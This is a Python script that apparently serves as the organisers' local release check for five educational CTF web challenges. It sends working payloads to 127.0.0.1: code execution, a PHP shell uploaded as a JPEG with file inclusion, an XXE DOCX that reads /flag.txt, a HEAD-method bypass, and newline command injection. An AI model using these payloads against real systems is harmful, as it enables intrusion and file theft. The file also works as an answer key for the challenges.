#!/usr/bin/env python3
"""Exercise the intended solution path of all locally running Web challenges."""

from __future__ import annotations

from io import BytesIO
from pathlib import Path
import sys
import urllib.parse
import urllib.request
import uuid
import zipfile

ROOT = Path(__file__).resolve().parents[1]
HOST = "127.0.0.1"
CHALLENGES = {
    "web-demo": ROOT / "challenges/intro/web-demo",
    "web-hard-upload-include": ROOT / "challenges/final/web/web-hard-upload-include",
    "web-bonus-xxe-docx": ROOT / "challenges/final/web/web-bonus-xxe-docx",
    "web-easy-method-head": ROOT / "challenges/final/web/web-easy-method-head",
    "web-medium-command-injection": ROOT / "challenges/final/web/web-medium-command-injection",
}


def expected_flag(challenge: str) -> str:
    return (CHALLENGES[challenge] / "flag.txt").read_text(encoding="utf-8").strip()


def request(url: str, *, data: bytes | None = None, headers: dict[str, str] | None = None, method: str | None = None):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    return urllib.request.urlopen(req, timeout=8)


def multipart(fields: dict[str, str], filename: str, content: bytes, content_type: str) -> tuple[bytes, str]:
    boundary = f"----edu-ctf-{uuid.uuid4().hex}"
    chunks: list[bytes] = []
    for name, value in fields.items():
        chunks.extend(
            [
                f"--{boundary}\r\n".encode(),
                f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode(),
                value.encode(),
                b"\r\n",
            ]
        )
    chunks.extend(
        [
            f"--{boundary}\r\n".encode(),
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'.encode(),
            f"Content-Type: {content_type}\r\n\r\n".encode(),
            content,
            b"\r\n",
            f"--{boundary}--\r\n".encode(),
        ]
    )
    return b"".join(chunks), f"multipart/form-data; boundary={boundary}"


def check_python_exec() -> None:
    flag = expected_flag("web-demo")
    data = urllib.parse.urlencode({"code": "print(open('/flag.txt').read())"}).encode()
    body = request(f"http://{HOST}:5101/", data=data).read().decode()
    assert flag in body


def check_upload_include() -> None:
    flag = expected_flag("web-hard-upload-include")
    payload = b"<?php echo file_get_contents('/flag.txt'); ?>"
    body, content_type = multipart({}, "payload.jpg", payload, "image/jpeg")
    request(
        f"http://{HOST}:5104/upload.php",
        data=body,
        headers={"Content-Type": content_type},
    ).read()
    result = request(f"http://{HOST}:5104/?page=uploads/payload.jpg").read().decode()
    assert flag in result


def check_xxe_docx() -> None:
    flag = expected_flag("web-bonus-xxe-docx")
    xml = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE document [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>'''
    docx = BytesIO()
    with zipfile.ZipFile(docx, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("word/document.xml", xml)
    fields = {"name": "a", "family": "b", "father": "c", "team": "d", "type": "get_hints"}
    body, content_type = multipart(fields, "payload.docx", docx.getvalue(), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")
    result = request(
        f"http://{HOST}:5105/",
        data=body,
        headers={"Content-Type": content_type},
    ).read().decode()
    assert flag in result


def check_method_head() -> None:
    flag = expected_flag("web-easy-method-head")
    response = request(f"http://{HOST}:5102/admin", method="HEAD")
    assert response.headers.get("X-Flag") == flag


def check_command_injection() -> None:
    flag = expected_flag("web-medium-command-injection")
    data = urllib.parse.urlencode({"ip": "127.0.0.1\nhead /flag.txt"}).encode()
    body = request(f"http://{HOST}:5103/", data=data).read().decode()
    assert flag in body


def main() -> int:
    checks = (
        ("web-demo", check_python_exec),
        ("web-hard-upload-include", check_upload_include),
        ("web-bonus-xxe-docx", check_xxe_docx),
        ("web-easy-method-head", check_method_head),
        ("web-medium-command-injection", check_command_injection),
    )
    failures = []
    for name, check in checks:
        try:
            check()
            print(f"[OK] {name}")
        except Exception as exc:  # concise diagnostics for a local release check
            failures.append(name)
            print(f"[ERROR] {name}: {exc}")
    if failures:
        print("Failed: " + ", ".join(failures))
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
